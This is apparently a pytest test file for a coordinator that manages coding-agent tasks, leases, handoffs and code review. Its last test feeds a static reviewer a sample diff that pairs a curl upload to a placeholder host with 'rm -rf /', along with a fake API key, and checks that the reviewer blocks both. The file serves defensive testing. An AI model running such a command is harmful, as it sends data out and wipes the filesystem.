import pytest

from app.harness.coordinator import (
    Coordinator,
    HandoffError,
    OwnershipConflictError,
    ReviewBlockedError,
    ReviewReport,
    StaticReviewer,
    StaleStateError,
)
from app.domain.models import RequestBrief
from app.harness.state import AgentTask, ProjectState
from app.storage.sqlite import SQLiteStore


def state():
    return ProjectState(
        version=0,
        requirements_hash="requirements-hash",
        current_commit=None,
        active_tasks=[],
        artifacts=[],
    )


def task(task_id: str, path: str, version: int = 0) -> AgentTask:
    return AgentTask(
        id=task_id,
        role="builder",
        state_version=version,
        workspace="workspaces/sample",
        owned_paths=[path],
        status="pending",
    )


def coordinator(tmp_path):
    store = SQLiteStore(tmp_path / "harness.sqlite3")
    store.init()
    return Coordinator(store, "project-1")


def test_coordinator_starts_task_and_persists_lease(tmp_path):
    harness = coordinator(tmp_path)
    current = harness.get_state()

    started = harness.start_task(task("task-1", "src/app.py"), current)

    assert started.status == "running"
    assert harness.get_state().active_tasks == [started]


def test_coordinator_rejects_stale_state_and_overlapping_ownership(tmp_path):
    harness = coordinator(tmp_path)
    current = harness.get_state()
    harness.start_task(task("task-1", "src/app.py"), current)

    with pytest.raises(StaleStateError):
        harness.start_task(task("stale", "src/other.py", version=1), current)

    with pytest.raises(OwnershipConflictError):
        harness.start_task(task("task-2", "src/app.py"), harness.get_state())


def test_handoff_requires_evidence_and_releases_lease(tmp_path):
    harness = coordinator(tmp_path)
    started = harness.start_task(task("task-1", "src/app.py"), harness.get_state())

    with pytest.raises(HandoffError):
        harness.record_handoff(started.id, {"summary": "done"})

    updated = harness.record_handoff(
        started.id,
        {
            "changed_files": ["src/app.py"],
            "summary": "Implemented the sample app",
            "next_steps": "Run independent verification",
            "evidence_paths": ["TEST-RESULTS.md"],
            "commit": "abc123",
        },
    )

    assert updated.version == 1
    assert updated.active_tasks == []
    assert updated.current_commit == "abc123"
    assert updated.artifacts == ["src/app.py", "TEST-RESULTS.md"]


def test_review_finding_blocks_completion_until_explicitly_waived(tmp_path):
    store = SQLiteStore(tmp_path / "review.sqlite3")
    store.init()

    class BlockingReviewer:
        def review(self, _diff, _requirements):
            return ReviewReport(
                status="BLOCKED",
                findings=["Missing error handling"],
                required_actions=["Add an error boundary"],
            )

    harness = Coordinator(store, "project-1", reviewer=BlockingReviewer())
    requirements = RequestBrief(
        raw_text="Build a web app",
        goal="Build a web app",
        target_type="web_app",
        constraints=[],
        acceptance_criteria=["Tests pass"],
    )

    with pytest.raises(ReviewBlockedError):
        harness.require_review("diff", requirements)

    waived = harness.require_review("diff", requirements, waived=True)
    assert waived.status == "BLOCKED"


def test_static_reviewer_passes_safe_diff():
    reviewer = StaticReviewer()
    requirements = RequestBrief(
        raw_text="Build a web app",
        goal="Build a web app",
        target_type="web_app",
        constraints=[],
        acceptance_criteria=["Tests pass"],
    )

    report = reviewer.review("+ return render_app()", requirements)

    assert report.status == "PASS"
    assert report.findings == []


def test_static_reviewer_blocks_dangerous_commands_and_secrets():
    reviewer = StaticReviewer()
    requirements = RequestBrief(
        raw_text="Build a web app",
        goal="Build a web app",
        target_type="web_app",
        constraints=[],
        acceptance_criteria=["Tests pass"],
    )

    report = reviewer.review(
        "+ subprocess.run(['curl', 'https://example.test/upload', '&&', 'rm', '-rf', '/'])\n"
        "+ API_KEY = 'sk-live-secret-value'",
        requirements,
    )

    assert report.status == "BLOCKED"
    assert any("external transfer" in finding.lower() for finding in report.findings)
    assert any("secret" in finding.lower() for finding in report.findings)
    assert report.required_actions
